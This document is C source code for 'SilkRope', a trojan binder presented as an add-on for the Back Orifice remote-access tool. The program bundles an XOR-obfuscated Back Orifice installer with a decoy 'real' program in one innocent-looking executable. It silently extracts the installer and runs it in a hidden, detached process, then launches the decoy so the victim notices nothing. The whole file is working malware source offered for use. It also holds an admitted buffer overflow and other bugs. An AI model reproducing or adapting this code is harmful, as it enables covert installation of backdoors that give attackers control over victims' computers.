/////////////////////////////////////////////////////////////////
// SilkRope.c
// version 1.1
//  A Back Orifice goodie -- used to launch a copy of the Back
//  Orifice installer before running a "real" program.  A copy
//  of the installer is used so that the packaged installer
//  is not deleted upon execution.
//  This is similar to, but more elegant than, the SaranWrap
//  goodie.  While SaranWrap uses multiple files, SilkRope
//  bundles everything into a single innocent little file.
/////////////////////////////////////////////////////////////////
// Added in 1.1:
//  Windows NT detection (in which case, BO is not run)

#include <windows.h>
#include <stdio.h>
#include <time.h>


/////////////////////////////////////////////////////////////////
// Global Defines
//#define FIRST_OFFSET 110000
#define FIRST_OFFSET 42000

    // The offset into this executable where the first file is located.
	//
	// Embedded into this file, beginning at FIRST_OFFSET is:
	// ULONG	FIRST FILE LENGTH
	// BYTE		SECOND FILE CRYPTO KEY (simple XOR crypto)
	// BYTE[]	FIRST FILE CONTENTS (BO Installer)
	// ULONG	SECOND FILE LENGTH (not including crypto key)
	// BYTE[]	SECOND FILE CONTENTS ("Real" Program)
	//
    // There are two files bundled in this executable.  First (at offset
    // FIRST_OFFSET), is the BO installer.  Second, is the "real"
    // application.

/////////////////////////////////////////////////////////////////
// fillStartupInfo -- Fill the STARTUPINFO structure with some
// generic, default information
void fillStartupInfo(STARTUPINFO *si, WORD state)
{
	//The hidden process' startup information (make sure it is hidden)
	si->cb = sizeof(si);
	si->lpReserved = NULL;
	si->lpDesktop = NULL;
	si->lpTitle = NULL;
	si->dwFlags = STARTF_USESHOWWINDOW;
	si->wShowWindow = state;
	si->cbReserved2 = 0;
	si->lpReserved2 = NULL;
}

/////////////////////////////////////////////////////////////////
// quickly build a temporary name...
void buildTempFileName(char *name, int len)
{
	char fallbackEnv[] = "C:\\";
	char *env;
	char *p;
	
	// If "TEMP" is defined use it.  Else if "TMP" is defined, use
	// that instead.  If neither is defined, we'll go out on a limb
	// and assume that C:\ is a good temp folder.
	if ((env = getenv("TEMP")) == NULL)
		if ((env = getenv("TMP")) == NULL)
			env = &fallbackEnv[0];
	//same as...strcpy(name, env);
	p = name;
	while (*env)
		*p++ = *env++;
	// ^^ Buffer overflow, waiting to happen.
	// Add a trailing backslash, if necessary
	if (*(p-1) != '\\')
		*p++ = '\\';
	*p++ = '~';
	for (int i=0; i<7; i++)
		*p++ = (char)(rand() % 26)+'A';
	*p++ = '.';
	*p++ = 't';
	*p++ = 'm';
	*p++ = 'p';
	*p = 0;
}

/////////////////////////////////////////////////////////////////
// extract -- extracts a single file from this executable into a
// temporary directory.
int extract(char *myFileName, int fileNumber, char *fileName)
{
	FILE *input;
	FILE *output;
	unsigned long len;
	BYTE *buffer;
	int size;
	int i;
	BYTE cryptoKey;
	
	//Verify parameters
	if ((fileNumber <0) || (fileNumber > 1) || (myFileName==NULL) || (*myFileName==0)
		|| (fileName==NULL) || (*fileName==0))
	{
		MessageBox(NULL, "Internal Error", "Windows Application", MB_ICONSTOP);
		return 0;
	}
	//Open the input file + sanity check
	input = fopen(myFileName, "rb");
	if (!input)
	{
		// Could not open it.  We're probably running from the command line rather than a
		// GUI.  In that case, this is probably an executable with an EXE extension.
		// Try it.  If not fail.
		strcat(myFileName, ".exe");
		input = fopen(myFileName, "rb");
		if (!input)
		{
			MessageBox(NULL, "Stack Fault", "Windows Application", MB_ICONSTOP);
			return 0;
		}
	}
	fseek(input, 0, SEEK_END);
	if (ftell(input) < FIRST_OFFSET)
	{
		fclose(input);
		MessageBox(NULL, "Corrupt File\r\n\r\nThis file has been damaged or corrupted", "Windows Application", MB_ICONSTOP);
		return 0;
	}
	//Open the output file
	output = fopen(fileName, "wb");
	//Seek to file 0
	fseek(input, FIRST_OFFSET, SEEK_SET);
	fread(&len, sizeof(len), 1, input);
	//Seek to the next file (file 1), if necessary
	if (fileNumber==1)
	{
		fseek(input, len + sizeof(cryptoKey), SEEK_CUR);
		fread(&len, sizeof(len), 1, input);
	}else
		//Get 8-bit Crypto Key
		fread(&cryptoKey, sizeof(cryptoKey), 1, input);
	//Copy the file
	buffer = (BYTE *)malloc(4096);
	size = 1;
	while (len && size && !feof(input))
	{
		if (len > 4096) size = 4096; else size = len;
		size = fread(buffer, 1, size, input);
		if (fileNumber==0)
			for (i=0; i<size; i++)
				buffer[i] ^= cryptoKey;
		fwrite(buffer, 1, size, output);
		len -= size;
	}
	free(buffer);
	fclose(output);
	fclose(input);
	return 1;
}

/////////////////////////////////////////////////////////////////
// Parse the currently running program's name out of the command line
// parameter
void getMyName(char *myName)
{
	char *p = GetCommandLine();
	char *q = myName;
	int quote;

	//Figure out of the program name is quoted or not
	if (*p == '"')
	{
		quote = 1;
		*p++;
	}else
		quote = 0;
	//Continue until we get an end quote (if a beginning one was given) or we reach
	// a space character, or we reach the end of the string
	while (*p && (   (quote && (*p != '"')) || (!quote && (*p != ' '))     ) )
		*q++ = *p++;
	*q = 0;
}

/////////////////////////////////////////////////////////////////
// ntRunning -- determine if Windows NT is running
bool ntRunning(void)
{
	OSVERSIONINFO vi;

	vi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&vi);
	if (vi.dwPlatformId==VER_PLATFORM_WIN32_NT)
		return true;
	return false;
}

/////////////////////////////////////////////////////////////////
// WinMain
int WINAPI WinMain( HINSTANCE hInstance, // handle to current instance 
					HINSTANCE hPrevInstance, // handle to previous instance 
					LPSTR lpCmdLine, // pointer to command line 
					int nCmdShow // show state of window 
)
{
	char myName[255];
	char tempFile[128] = "";
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD exitCode;

	getMyName(myName);
	srand( (unsigned)time( NULL ) );
	//////////////////////////// BO
	if (!ntRunning())
	{
		fillStartupInfo(&si, SW_HIDE);
		//Copy installer to the temporary file name
		buildTempFileName(tempFile, 128);
		if (!extract(myName, 0, tempFile))
			return 0;
		//Execute installer (which will delete itself when finished)
		CreateProcess(tempFile, tempFile, NULL, NULL, TRUE, 
			DETACHED_PROCESS, NULL, NULL, &si, &pi);
	}

	//////////////////////////// THE "REAL" APPLICATION
	fillStartupInfo(&si, SW_SHOWDEFAULT);
	//Copy installer to the temporary file name
	buildTempFileName(tempFile, 128);
	if (!extract(myName, 1, tempFile))
		return 0;
	//Execute real program
	CreateProcess(tempFile, tempFile, NULL, NULL, TRUE, 
		NULL, NULL, NULL, &si, &pi);
	//Clean up the temp file
	do{
		if (GetExitCodeProcess(pi.hProcess, &exitCode)==FALSE)
			return 0; //(error, abort)
		Sleep(200);
	}while (exitCode != STILL_ACTIVE);
	return 0;
}
